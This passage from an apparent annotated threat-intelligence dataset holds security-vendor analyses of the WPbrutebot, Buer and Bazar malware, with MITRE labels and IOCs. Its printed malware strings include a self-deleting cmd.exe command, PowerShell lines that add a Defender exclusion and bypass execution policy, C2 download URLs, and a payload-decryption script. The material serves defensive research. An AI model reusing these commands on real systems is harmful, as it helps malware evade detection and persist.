campaign.\nAdditionally, the payloads appear to be new\u00a0and had no specific attribution, so we have given a new name to this program based on its activity\u2014Win32.Backdoor.WPbrutebot.\n**Technical analysis**\nIn our research, we found several samples pertaining to this campaign but we analyzed one sample here for brevity and as an example.\nIn the sample set we worked on, we found that almost all samples used Microsoft-version information, but all of them lack a legitimate Windows Digital Signature and left the company name as TODO, which implies that these files are being generated through a script and this section is still a work in progress.\n![Figure 1: Common metadata used in most files in this campaign](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/WPbrutebot/Figure%201.png)\n*Figure 1: The common metadata used in most files in this campaign.*\nAnother feature we found was that InternalName was always a sequence of 2s.\nUnfortunately, we weren\u2019t able to conclude if this was intentional or not.\nThe initial layer of the malware is for decoding the URIs used to make initial contact with the C&C server.\nThe first section is unpacked as shown in Figure 2:\n![Figure 2: Decryption Loop](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/WPbrutebot/Figure%202.png)\n*Figure 2: The decryption loop of this program.*\nThis decryption loop is a simple XOR decryption that sequentially runs from B5 to C7, which gives us /lk4238fh317/update.php.\nFigure 3 shows the debugger dump.\n![Figure 3: Decrypted String](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/WPbrutebot/Figure%203.png)\n*Figure 3: The decrypted string of this program.*\nNext, the domain is generated using another XOR-based decryption where the key goes from B5 to C0.\n![Figure 4: Decryption Loop](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/WPbrutebot/Figure%204.png)\n*Figure 4: The decryption loop for this program.*\nThe domain generated is k6239847[.]lib.\nThis URL is then used with blockchain DNS.\n![Figure 5: DNS Query](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/WPbrutebot/Figure%205.png)\n*Figure 5: The DNS query.*\nThe blockchain DNS URI is decrypted using a similar XOR loop as shown in Figure 6.\nThe value compared depends on the size of the blockchain DNS URI.\n![Figure 6: Decryption Loop](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/WPbrutebot/Figure%206.png)\n*Figure 6: The decryption loop.*\nThese are first assembled in heap using **RtlAllocateHeap**.\n![Figure 7: Decrypted Strings](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/WPbrutebot/Figure%207.png)\n*Figure 7: The decrypted strings.*\nThe code shown in Figure 8 is called several times to allocate heap to save decrypted strings that are used later to perform network activity or for creating files.\n![Figure 8: Api Call](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/WPbrutebot/Figure%208.png)\n*Figure 8: The API call details.*\nThis same code is reused to assemble user-agent strings, which are later used\u00a0for making internet connections.\n![Figure 9: User-Agents used](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/WPbrutebot/Figure%209.png)\n*Figure 9: The user-agents employed in this attack.*\nThis is then used to create a DNS request for the blockchain DNS server.\n![Figure 10: Concatenated URL](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/WPbrutebot/Figure%2010.png)\n*Figure 10: The concatenated URL.*\nThe DNS request generated produces a C&C IP of 217.8.117[.]48, which can be confirmed online at explorer.emercoin[.]com/nvs/dns.\n![Figure 11: Domains found at emercoin.com](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/WPbrutebot/Figure%2011.png)\n*Figure 11: The domains found at emercoin.com.*\nThe segment of a URL created during the first decryption loop (as shown above) is then used with the IP address to contact the C&C.\nThe URL created is 217.8.117[.]48/lk4238fh317/update.\nThe C&C then replies back with 217.8.117[.]48/j537djjlhg763/svchst.exe, which is the downloaded payload.\nThe payload is downloaded at C:\\Users\\User-Name\\AppData\\Roaming\\svchst.exe.\n![Figure 12: Downloading updated version of itself](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/WPbrutebot/Figure%2012.png)\n*Figure 12: The program downloading an updated version of itself.*\nThe downloaded sample (MD5:86374F27C1A915D970BE3103D22512B9) is an updated version of the parent sample, which downloads itself to ensure that the latest version of the malicious program is running on the system.\nThis sample also performs a DNS query on k6239847[.]lib.\nThe string is obfuscated by breaking the string in two parts\u2014k623 and 9847.lib, which are concatenated in memory.\nThis time, a command is run using cmd.exe */C ping 1.1.1.1 -n 1 -w.*, where *-n* means the number of echo requests to send and *-w* is the timeout in milliseconds to wait for each reply.\n1.1.1.1 is popular DNS service by Cloudflare.\nThe full command is cmd.exe /C ping 1.1.1.1 -n 1 -w -n 1 -w3000 > Nul & Del /f /q \\\"%s.\nThe program then enumerates system information including information such as user name, processor architecture, and more.\n![Figure 13:Algorithm to initiate /xmlrpc.php attack](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/WPbrutebot/Figure%2013.png)\n*Figure 13: The algorithm to initiate the /xmlrpc.php attack.*\n![Figure 14: Attack vectors found in file](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/WPbrutebot/Figure%2014.png)\n*Figure 14: The attack vectors found in the file.*\nHere, the malicious program is using ***<methodName>wp.getUsersBlogs</methodName>*** to execute a brute force attack via the \u201c*wp.getUsersBlogs*\u201d method of xmlrpc.php where an attacker is actually doing a reverse IP lookup for the IPs fetched from the C&C and is looking for all the available methods on the corresponding DNS.\nOnce found, it attempts to gain the login via cookie-based authentication by logging into WordPress using cURL, authenticating the server (which ran the cURL script) and providing the username/password to the login page of the desired WordPress site.\nHere is a redacted list of a few WordPress sites the attacker is trying to attack leveraging this malware payload:\n![Figure 15: Brute Force attack on wordPress sites](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/WPbrutebot/Figure%2015.png)\n*Figure 15: The list of WordPress sites targeted for a brute force attack.*\nWe then went on hunting for similar samples.\nWe were able to unearth more samples connecting to the same domains (k6239847.lib)\u00a0and IP address (217.8.117.48).\nThe samples we found had similar activity but used a .space TLD domain as one of its C&C.\n**Cloud Sandbox detection**\nThe malware payload was successfully detected and blocked by the Zscaler Cloud Sandbox as seen in the Figure 16.\n![Figure 16: The Zscaler Cloud Sandbox successfully detected the malware.](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/WPbrutebot/Figure%2016.png)\n*Figure 16: The Zscaler Cloud Sandbox successfully detected the malware.*\nAdvanced Threat Signature name:\n[Win32.Backdoor.Wpbrutebot](https://threatlibrary.zscaler.com/?keyword=wpbrutebot)\n**Conclusion**\nDue to its popularity, WordPress is a common target for cyberattacks.\nAs such, WordPress admins need to be on alert to reports of newly found vulnerabilities and attacks.\nIn addition, WordPress admin should keep the XML-RPC option disabled and refrain from using logins from third-party applications.\nZscaler continues to protect our customers from such attacks and detects these malicious programs in our Cloud Sandbox in real time.\n**MITRE ATT&CK TTP Mapping**\n| **T1212** | **Credential Access** |\n| **T1110** | **Brute Force** |\n| **T1556** | **Modify Authentication Process** |\n| **T1497** | **Sandbox Evasion** |\n| **T1055** | **Process Injection** |\n| **T1003** | **OS Credential Dumping** |\n| **T1491** | **Defacement** |\n**IOCs**\nHashes:\n2ed7662ec8e2022d9cebec3a8ebaf838\nc09cf4312167fa9683d8e8733004b7e6\n86374f27c1a915d970be3103d22512b9\nd88a7fca98e89aaf593163b787165766\n03caf1cf96f95b82536fc8b7d94c5a61\n74f5107acd2e51dc407253f15d718be3\na54fa899a524f0cd34ae90f9820b41e0\nIPs:\n207.148.83[.]241\n5.132.191[.]104\n66.70.228[.]164", "mitre_ids": ["T1190", "T1190", "T1190", "T1190", "T1190", "T1110", "TA0011", "T1190", "TA0011", "T1140", "T1140", "T1140", "T1140", "T1140", "T1140", "T1140", "T1140", "T1140", "T1140", "T1140", "TA0011", "TA0011", "T1140", "TA0011", "T1105", "T1105", "T1105", "T1105", "T1027", "T1082", "T1110", "TA0011", "T1046", "TA0006", "T1110", "T1110", "TA0011", "T1110", "T1110", "T1556", "T1497", "T1055", "T1003", "T1491"], "anno_name_label": [["TOOL", "curl"]], "cti_entity_class": ["CI", "CI", "CI", "CI", "CI", "CI", "CE", "CI", "CE", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CE", "CE", "CI", "CE", "CI", "CI", "CI", "CI", "CI", "CI", "CE", "CE", "CI", "CE", "CI", "CI", "CI", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CE"]}, {"cti_report": "Spear Phishing Campaign Delivers Buer and Bazar Malware\nSeptember 29, 2020\nZscaler ThreatLabZ became aware of a prevalent phishing campaign targeting employees of various organizations.\nDuring the past couple of weeks, many enterprise users have been getting spear phishing emails indicating that their employment with the company has been terminated.\nThese emails contain a Google document link that leads to the Bazar backdoor (from the TrickBot gang).\nWhat's interesting is that this campaign also used the Buer loader, which is the first time we have seen these two malware strains used together.\nUse of the Buer loader by the TrickBot gang comes as no surprise as this group is\u00a0known to work with different malware\u00a0groups.\nIn the past, the TrickBot gang\u00a0has also\u00a0worked with other botnets, such as\u00a0Emotet.\n### Campaign\nIn this email campaign, instead of relying on attachments, the attackers included links to what appeared to be a legitimate Google Docs document, which itself contained links to malicious files hosted\u00a0on Google Drive or, in some cases, hosted elsewhere.\nIn some previous phishing email campaigns,\u00a0attackers leveraged SendGrid to distribute the initial emails to hide the Google Drive links in the documents behind a SendGrid URL as a way to bypass traditional defences.\nSamples of emails that we have seen are shown in Figure 1 and Figure 2.\n![Spear Phishing email template 1](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/sadique/bazar/mail1_1.PNG)\n*Figure 1: One of the spear phishing email templates targeting an employee.*\n![Spear Phishing email template 2](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/sadique/bazar/mail2_0.PNG)\n*Figure 2: Another spear phishing email template*\nThe link in both emails is a Google Docs link claiming to host a PDF file with a list of employees that have been\u00a0terminated, as shown in Figure 3.\n![Google Document containing link to download](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/sadique/bazar/doc.png)\n*Figure 3: The link to the fake\u00a0Google Doc\u00a0containing the download link.*\nThe link in the Google Doc\u00a0redirects to the\u00a0URL unitedyfl[.]com/print\\_preview.exe to download the\u00a0malware payload.\nAlthough, the use of target names with actuating themes is not new to this group, there has been a significant uptick in the number of emails received and this campaign has been persistently active for the past\u00a0few weeks.\n### Packer\nIn most cases, the payload that is downloaded is the Bazar malware but, in some cases, it is the Buer loader.\nThe packer used in both malware payloads is identical.\nMost notably, the packed binaries are exe files with a randomly named export function.\nThe export function is responsible for payload decryption and injection.\nFirst, a shellcode is decrypted, which further decrypts a headerless PE\u00a0loader that has the final payload in its overlay.\nThe headersless loader allocates memory, maps the payload into memory with proper permissions, and finally transfers control to it.\nIn this campaign, no process self-injection is used to load the payload.\n![Headerless PE loader](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/sadique/headerless_loader.png)\n*Figure 4: The decrypted header less PE loader.*\n![Payload embedded at end of loader](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/sadique/payload.png)\n*Figure 5: The payload embedded at the end of the loader.*\n### Bazar loader and Bazar backdoor\nThe Bazar backdoor is a new stealthy malware, part of the TrickBot group\u2019s toolkit arsenal and leveraged for high-value targets.\nThe Bazar loader is used to download and execute the Bazar backdoor on the target system.\nThe goal of this backdoor is to execute binaries, scripts, modules, kill processes, and then remove itself from the compromised machine.\nThe samples used in this campaign heavily rely on\u00a0control flow obfuscation.\nThe detailed analysis report about this backdoor can be found [here](https://www.vkremez.com/2020/04/lets-learn-trickbot-bazarbackdoor.html).\nThe Bazar loader downloads the Bazar backdoor from the C&C using the following URI format:\n{C&C}/api/v\\d{3}\nThe downloaded payload is XOR-encrypted and can be decrypted using the script provided in the appendix.\nThe downloaded malware was successfully captured by the Zscaler Cloud Sandbox:\n![Zscaler Sandbox Report](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/sadique/bazar/sandbox.JPG)\n*Figure 6: The\u00a0Zscaler Cloud Sandbox report.*\nThe C&C TLS communications of the Bazar backdoor have been using certificates created in the same manner that TrickBot certificates have been created.\nThe C&C server TLS certificate is shown in Figure 7.\n![Bazar/Trickbot TLS Certificate](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/sadique/bazar/trickbot_cert.JPG)\n*Figure 7: The\u00a0Bazar/TrickBot TLS certificate.*\nResearchers also observed that the backdoor downloads and executes the Cobalt Strike penetration testing and post-exploitation toolkit on the victim's machine within some period of time after the infection.\nBy deploying Cobalt Strike, it is clear that this stealthy backdoor is being used to gain a foothold\u00a0in corporate networks so that ransomware can be deployed, data can be stolen, or network access could be sold to other threat actors.\n### Buer loader\nThe Buer loader was first discovered around the end of 2019.\nIt is a very capable malware written in C and primarily sold on Russian underground forums for around US$400.\nNotably, this malware does not function in the CIS.\nIt has most of the important strings encrypted and APIs are loaded by hash, just\u00a0like most of the sophisticated malware\u00a0these days.\nWe are not going to go into technical details because detailed analysis of this has already [published](https://krabsonsecurity.com/2019/12/05/buer-loader-new-russian-loader-on-the-market-with-interesting-persistence/).\nThe Buer loader was captured by the Zscaler Cloud Sandbox.\n![Buer Loader sandbox report](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/sadique/bazar/buer%20sandbox.png)\n*Figure 8: The Zscaler Cloud Sandbox report for the Buer loader.*\nIn addition to sandbox detections, Zscaler\u2019s multilayered cloud security platform detects indicators at various levels:\n[Win32.Trojan.Buerloader](https://threatlibrary.zscaler.com/?keyword=Win32.Trojan.Buerloader)\n[Win32.Backdoor.Bazar](https://threatlibrary.zscaler.com/?keyword=Win32.Backdoor.Bazar)\n**Conclusion**\n--------------\nThe TrickBot group has been running similarly themed campaigns for some time.\nThe targeted nature of the campaign with subject lines having the organization\u2019s name makes these campaign\u2019s highly effective compared to generic spray-and-pray attacks.\nBut even these specially crafted attacks are not immune from a pair of vigilant eyes and the right set of tools.\nWe at Zscaler ThreatLabZ\u00a0are always on the lookout for bad stuff\u2014be it for our company or for our customers\u2014to provide protection against it.\nLast but not the least, always be attentive while opening any email links or attachments.\nEven if there is a tiny bit of suspicion, verify the email or get it reviewed\u00a0thoroughly by your security team before proceeding further.\nIOCs\n----\n#### **MD5**\nFa0322fb70610d6e67585588184eda39 (Buer loader)\n06f42898d5b2303c0b455d3152ced044 (Bazar loader)\n04a20c9f33023439b612935b6901917f (Bazar loader)\n951acc18e4f14471f49235327e0c1ccc (Bazar loader)\n4bb9a709958a1790a6bc257a9b5cb48e (Bazar loader)\n03e699324d06bd3d597994f5df893048 (Bazar backdoor group: t1)\n#### **Distribution and document URLs**\nhttp://unitedyfl[.]com/print\\_preview.exe\nhttps://docs.google[.]com/document/u/1/d/e/2PACX-1vTwnIt9tXcgRxaOME9G3yErRp50dGxW1EKoTeIAYZwkMEg4j8fOpU9kP7xMJ6pufKfzsoETJwX5ZMM5/pub\nhttps://docs.google[.]com/document/u/1/d/e/2PACX-1vSE2BfEV4tOmHOpMzeBhWbyajWwjxajBvm1YpJSRWyDL-qXbnSsu-OHhyuT2Y4mbZ72uPT9uToZWvo2/pub\nhttps://docs.google[.]com/document/u/1/d/e/2PACX-1vTCf1OgjnHoaohnZ0BMwCFRU62HyC85BfeiX7NGPiwvrqr8P-\\_-Y\\_5Mab9wAJjCIcldWv8wvKVXFuiK/pub\nhttps://docs.google[.]com/document/d/e/2PACX-1vQ4MCpbsYfwekk44caru7p05aOKswFPvyQNsyow1Qfg1exHrGZHaqOmWcnSeAxmDK2V1i3ml9DP8kYT/pub\nhttps://docs.google[.]com/document/d/e/2PACX-1vRl0GvrO4JO8Rs4v1BTtXmsMThv1M413Z14onQl-TkrsXZEOOr1zF8gKu3GDOwFBN0kaw5g7oC7lbIE/pub\nhttps://docs.google[.]com/document/d/e/2PACX-1vR0NwqguWEFX4ZilvsxKSaJQbUfXpfK5fvWxbxUBJfPzbmvGuxHS7bltp9cjpJ0RvrvdlAxeKpSjDKQ/pub\n#### **C&C**\n**Buer loader**\n104.248.83[.]13\n**Bazar loader**\n164.68.107[.]165\n91.235.129[.]64\n37.220.6[.]126\n195.123.241[.]194\n82.146.37[.]128\n85.143.221[.]85\n164.132.76[.]76\n54.37.237[.]253\n### **Some of the URIs seen in this campaign include**\n* /api/v190 - Download Updated Bazar loader(64 - bit)\n* /api/v192 - Download Bazar backdoor(64 - bit)\n* /api/v202 - (Server did not respond with payload at the time of analysis)\n* /api/v207 - (Server did not respond with payload at the time of analysis)\n#### **PDB string**\nc:\\Users\\Mr.Anderson\\Documents\\Visual Studio 2008\\Projects\\Anderson\\x64\\Release\\Anderson.pdb\n#### **Some of the subject lines observed**\n| Re: {Target Company Name} termination list |\n| Re: {Target Company Name} avoiding |\n| FW: Urgent: {Target Company Name}: A Customer Complaint Request \u2013 Prompt Action Required |\n| RE: FYI: {Target Company Name} Employees Termination List \u2013 Confirmation Required |\n| Re: complaint request |\n| Re: my call, {Target Company Name}.\n|\n| Re: {Target Company Name} - my visit |\n| Re: can't call you |\n**MITRE ATT&CK**\n----------------\n| **ID** | **Technique** |\n| T1566.002 | Phishing: Spearphishing Link |\n| T1566.003 | Phishing: Spearphishing via Service |\n| T1204.001 | User Execution: Malicious Link |\n| T1204.002 | User Execution: Malicious File |\n| T1547.001 | Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder |\n| T1055.013 | Process Injection: Process Doppelg\u00e4nging |\n| T1055.012 | Process Injection: Process Hollowing |\n| T1027.002 | Obfuscated Files or Information: Software Packing |\n| T1140 | Deobfuscate/Decode Files or Information |\n| T1036.005 | Masquerading: Match Legitimate Name or Location |\n| T1087 | Account Discovery |\n| T1010 | Application Window Discovery |\n| T1083 | File and Directory Discovery |\n| T1057 | Process Discovery |\n| T1012 | Query Registry |\n| T1018 | Remote System Discovery |\n| T1082 | System Information Discovery |\n| T1033 | System Owner/User Discovery |\n| T1124 | System Time Discovery |\n| T1119 | Automated Collection |\n| T1005 | Data from Local System |\n| T1053.002 | Scheduled Task/Job: At (Windows) |\n| T1547.004 | Boot or Logon Autostart Execution: Winlogon Helper DLL |\n| T1071.001 | Application Layer Protocol: Web Protocols |\n| T1568.002 | Dynamic Resolution: Domain Generation Algorithms |\n| T1020 | Automated Exfiltration |\n| T1041 | Exfiltration Over C2 Channel |\n| T1568.002 | Dynamic Resolution: Domain Generation Algorithms |\nAppendix\n--------\n**Script to decrypt downloaded Bazar backdoor**\n```\nkey = \"20200915\"\ndata = open(\"v190\", 'rb').read()\nout = \"\"\nfor i in range(len(data)):\nout += chr(ord(data[i]) ^ ord(key[i%len(key)]))\nof = open('dec1', 'wb')\nof.write(out)\nof.close()\n*#Note: Key can vary between downloader samples*\n```\n**Buer strings**\n```\nUc3nakqfdpmcFjc\npowershell.exe -Command \"& {Add-MpPreference -ExclusionPath\nupdate\nKdc23icmQoc21f\nopen\n.dll\nrundll32\nregsvr32\npowershell.exe \"-Command\" \"if((Get-ExecutionPolicy ) -ne\u00a0 'AllSigned')\u00a0 { Set-ExecutionPolicy -Scope Process Bypass }; & '\n%02x\nPOST\nContent-Type: application/x-www-form-urlencoded\nrunas\n%s, \"%s\"\nSoftware\\Microsoft\\Windows\\CurrentVersion\\RunOnce\n{%s-%d-%d}\nntdll.dll\nmyyux?44659379=3=83684\nmyyux?44659379=3=83684\nmyyux?44659379=3=83684\nmyyux?44659379=3=83684\nmyyux?44659379=3=83684\nUndefinedTypeError>>1I5480%C9#5=O=B8\nhd0OkaN3/Iqc7\\_Kdh\nsecinit.exe\nfalse\ntrue\nnull\nhttps://104.248.83.13/\napi/update/\nhttps://104.248.83.13/\napi/update/\nX4OIvcO7uWS\nupdate\nstatusCode\nAccessToken\nmethod\nx64\nexelocal\nmemload\nmemloadex\napi/download/\napi/downloadmodule/\ndownload\\_and\\_exec\ndownload\\_and\\_exec\nregsrv32\nrundll\nrundllex\nparameters\nautorun\nexplorer.exe\napi/module/\nmodules\nloaddllmem\nAdmin\nUser\nWindows 10\nWindows Server 2019/Server 2016\nWindows 8.1\nWindows Server 2012 R2\nWindows 8\nWindows Server 2012\nWindows 7\nWindows Server 2008 R2\nWindows XP\nSQCP]ICW\nX4OIvcO7uWS\nUnknown\nx32\nx64\nLdrLoadDll\nRtlCreateUserThread\nLdrGetProcedureAddress\nRtlFreeUnicodeString\nRtlAnsiStringToUnicodeString\nRtlInitAnsiString\nMozilla/5.0 (Apple-iPhone7C2/1202.466; U; CPU like Mac OS X; en) AppleWebKit/420+ (KHTML, like Gecko) Version/3.0 Mobile/1A543 Safari/419.3\nX4OIvcO7uWS\ndllhost.exe\ndllhost.exe\nSoftware\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\nShell\nopen\nakb,cvc\n%ALLUSERSPROFILE%\nOstersin\n\\AutoReg.exe\n\" ensgJJ\nensgJJ\nexplorer.exe\nsecinit.exe\nshell32.dll\nWinhttp.dll\nadvapi32.dll\nuser32.dll\nnetapi32.dll\nNtWriteVirtualMemory\nLr?jjma\\_rcTgprs\\_jKckmpw\nJbpEcrNpmacbspc?bbpcqq\nLrOscpwTgprs\\_jKckmpw\nLrDpccTgprs\\_jKckmpw\nLrNpmrcarTgprs\\_jKckmpw\nLrPc\\_bTgprs\\_jKckmpw\nLrEcrAmlrcvrRfpc\\_b\nLrQcrAmlrcvrRfpc\\_b\u00a0\n```\n**Buer loader API hashes and corresponding API names**\n```\n0x69f7df2a -> advapi32\\_GetTokenInformation\n0xe79d18d6 -> kernel32\\_OpenProcessToken\n0x47979a8f -> advapi32\\_GetCurrentHwProfileW\n0x19e1e0c2 -> kernel32\\_RegCreateKeyExW\n0xd45f73b5 -> kernel32\\_RegCloseKey\n0xcb5998e2 -> kernel32\\_RegSetValueExW\n0xce636ff5 -> advapi32\\_GetSidSubAuthority\n0xaf7f658e -> winhttp\\_WinHttpOpen\n0x20b4c051 -> winhttp\\_WinHttpSetTimeouts\n0x8ef04f02 -> winhttp\\_WinHttpCrackUrl\n0x9f47a05e -> winhttp\\_WinHttpConnect\n0x1dd1d38d -> winhttp\\_WinHttpOpenRequest\n0x26d17a4e -> winhttp\\_WinHttpSendRequest\n0xb20e6a35 -> winhttp\\_WinHttpGetIEProxyConfigForCurrentUser\n0x1ef97964 -> winhttp\\_WinHttpGetProxyForUrl\n0x8678c3f6 -> winhttp\\_WinHttpSetOption\n0xea74138b -> winhttp\\_WinHttpWriteData\n0x80cc5bd7 -> winhttp\\_WinHttpReadData\n0x6c3f3920 -> winhttp\\_WinHttpReceiveResponse\n0xde67ac3c -> winhttp\\_WinHttpQueryHeaders\n0x710832cd -> winhttp\\_WinHttpQueryDataAvailable\n0x9964b3dc -> winhttp\\_WinHttpCloseHandle\n0x302ebe1c -> kernel32\\_VirtualAlloc\n0x4247bc72 -> kernel32\\_VirtualQuery\n0x1803b7e3 -> kernel32\\_VirtualProtect\n0x1a4b89aa -> kernel32\\_GetCurrentProcess\n0x8a8b4676 -> kernel32\\_LoadLibraryA\n0x1acaee7a -> kernel32\\_GetProcAddress\n0x61eebd02 -> kernel32\\_GetModuleHandleW\n0x8a8b468c -> kernel32\\_LoadLibraryW\n0xab489125 -> kernel32\\_GetNativeSystemInfo\n0x34590d2e -> kernel32\\_GetLastError\n0x5b3716c6 -> kernel32\\_GlobalFree\n0xe183277b -> kernel32\\_VirtualFree\n0x62f1df50 -> kernel32\\_VirtualFreeEx\n0xdd78764 -> kernel32\\_VirtualAllocEx\n0xf3cf5f6f -> kernel32\\_GetModuleFileNameW\n0xae7a8bda -> kernel32\\_CloseHandle\n0x29e91ba6 -> kernel32\\_HeapSize\n0xe3802c0b -> kernel32\\_HeapAlloc\n0x864bde7e -> kernel32\\_GetProcessHeap\n0x12dfcc4e -> kernel32\\_ExitProcess\n0x7722b4b -> kernel32\\_TerminateProcess\n0xb4f0f46f -> kernel32\\_CreateProcessW\n0xff5ec2ce -> kernel32\\_ExitThread\n0x4b3e6161 -> kernel32\\_TerminateThread\n0xed619452 -> kernel32\\_CreateMutexW\n0x7bffe25e -> kernel32\\_OpenMutexW\n0xf785ce6 -> kernel32\\_ReadFile\n0xe6886cef -> kernel32\\_WriteFile\n0x1a7f0bab -> kernel32\\_CreateFileW\n0xbdfa937d -> kernel32\\_GetFileSize\n0x617ea42b -> kernel32\\_DeleteFileW\n0x6659de75 -> kernel32\\_WriteProcessMemory\n0xc56e656d -> kernel32\\_GetCommandLineW\n0x78c1ba50 -> kernel32\\_ExpandEnvironmentStringsW\n0x2e0ccb63 -> kernel32\\_CreateDirectoryW\n0x5c62ca81 -> kernel32\\_WaitForSingleObject\n0x8edf8b90 -> kernel32\\_OpenProcess\n0x8a62152f -> kernel32\\_CreateToolhelp32Snapshot\n0xc9112e01 -> kernel32\\_Process32NextW\n0x63f6889c -> kernel32\\_Process32FirstW\n0x4b9358fc -> kernel32\\_DuplicateHandle\n0x24e2968d -> kernel32\\_GetComputerNameW\n0x110e739a -> kernel32\\_GetVolumeInformationW\n0xf7643b99 -> kernel32\\_GetThreadContext\n0x3cc73360 -> kernel32\\_ResumeThread\n0x77643b9b -> kernel32\\_SetThreadContext\n0x1c2c653b -> ntdll\\_memset\n0x1c846140 -> ntdll\\_memcpy\n0x932d8a1a -> ntdll\\_NtDelayExecution\n0x9716d04e -> ntdll\\_NtReleaseMutant\n0x6f7f7a64 -> ntdll\\_RtlGetVersion\n0x996cc394 -> ntdll\\_ZwUnmapViewOfSection\n0xabf93436 -> ntdll\\_strtoul\n0x2bd04fd1 -> ntdll\\_iswctype\n0x26a5553c -> ntdll\\_strstr\n0x4117fd0e -> ntdll\\_NtQueryDefaultLocale\n0xd24c9118 -> ntdll\\_RtlCreateUserThread\n0xd52ff865 -> ntdll\\_NtQueryVirtualMemory\n0x339c09fb -> ntdll\\_NtQueryInformationProcess\n0x6a13016e -> ntdll\\_NtSetInformationThread\n0x6debaaa9 -> ntdll\\_NtFilterToken\n0xd584ba6c -> shell32\\_SHGetFolderPathW\n0x375eadf4 -> shell32\\_CommandLineToArgvW\n0xba1eb35b -> shell32\\_ShellExecuteW\n0xf674afe0 -> user32\\_wsprintfW\n```\n**References**\n--------------\n<https://www.bleepingcomputer.com/news/security/bazarbackdoor-trickbot-gang-s-new-stealthy-network-hacking-malware/>\n<https://www.vkremez.com/2020/04/lets-learn-trickbot-bazarbackdoor.html>\n<https://krabsonsecurity.com/2019/12/05/buer-loader-new-russian-loader-on-the-market-with-interesting-persistence/>", "mitre_ids": ["T1566", "T1566", "T1566", "S0534", "S0367", "T1566", "T1566", "T1566", "T1036", "T1566", "T1566", "T1566", "T1566", "T1566", "T1566", "T1566", "T1566", "T1566", "T1027", "S0534", "T1027", "T1027", "T1140", "T1059", "T1140", "S0534", "S0534", "S0534", "S0534", "TA0002", "S0534", "TA0002", "T1562", "T1070", "T1027", "S0534", "S0534", "TA0011", "T1105", "TA0011", "T1027", "TA0011", "S0534", "S0183", "T1573", "TA0011", "T1573", "S0534", "S0266", "S0534", "S0183", "TA0002", "S0154", "T1105", "S0154", "T1486", "T1486", "TA0010", "T1027", "S0183", "S0534", "S0534", "S0534", "S0534", "S0534", "TA0011", "S0534", "S0534", "S0534", "T1566", "T1566", "T1204", "T1204", "T1547", "T1055", "T1055", "T1027", "T1140", "T1036", "T1087", "T1010", "T1083", "T1057", "T1012", "T1018", "T1082", "T1033", "T1124", "T1119", "T1005", "T1053", "T1547", "T1071", "T1568", "T1020", "T1041", "T1568", "S0534"], "anno_name_label": [["MALWARE", "Buer"], ["MALWARE", "Buer"], ["GROUP", "TrickbotGang"], ["MALWARE", "Buer"], ["MALWARE", "Buer"], ["GROUP", "TrickbotGang"], ["GROUP", "TrickbotGang"], ["MALWARE", "Buer"], ["TOOL", "PE loader"], ["TOOL", "PE loader"], ["TOOL", "PE loader"], ["GROUP", "TrickbotGang"], ["MALWARE", "Buer"], ["MALWARE", "Buer"], ["MALWARE", "Buer"], ["MALWARE", "Buer"], ["MALWARE", "Buer"], ["MALWARE", "Buer"], ["MALWARE", "Buer"], ["MALWARE", "Buer"], ["MALWARE", "Buer"]], "cti_entity_class": ["CE", "CE", "CE", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CI", "CE", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CE", "CE", "CE", "CI", "CI", "CI", "CE", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CI", "CI", "CI", "CE", "CE", "CE", "CI", "CE", "CI", "CE", "CE", "CE", "CI", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CE", "CE", "CI", "CI", "CE", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE"]}, {"cti_report": "Targeted Attacks on Oil and Gas Supply Chain Industries in the Middle East\nSeptember 29, 2020\nCybercriminals are known to look to current events to make their schemes and campaigns more engaging and relevant to unsuspecting victims.\nThese events don't need to be global in nature, and\u00a0are often only of\u00a0local or regional interest.\nThis helps the bad actors narrow their target hoping for a greater chance of success.\nSo when the Abu Dhabi National Oil Company (ADNOC) terminates\u00a0[engineering, procurement and construction (EPC) contracts it had previously awarded,](https://meed.com/adnoc-awards-dalma-gas-project-to-petrofac-and-sapura) attentive cybercriminals have new fodder for another scheme.\nSince July 2020, the Zscaler ThreatLabZ\u00a0team has observed an increase in targeted attacks against multiple supply chain-related organizations in the oil and gas sector in the Middle East.\nWe discovered multiple instances of malicious PDF files sent as email attachments and were used to distribute an information-stealing Trojan, AZORult, to these organizations.\nIn this blog, we describe the details of this campaign,\u00a0explaining the attack vectors, the malware distribution strategy, and the threat attribution.\n### **Distribution strategy**\nThe attack chain begins with an email that appears to be from an official working at the ADNOC and\u00a0is targeted\u00a0at officials working in the supply chain and government sectors in the Middle East.\nEach email in this campaign has an attached PDF file.\nThis PDF contains download links on the first page that lead to legitimate 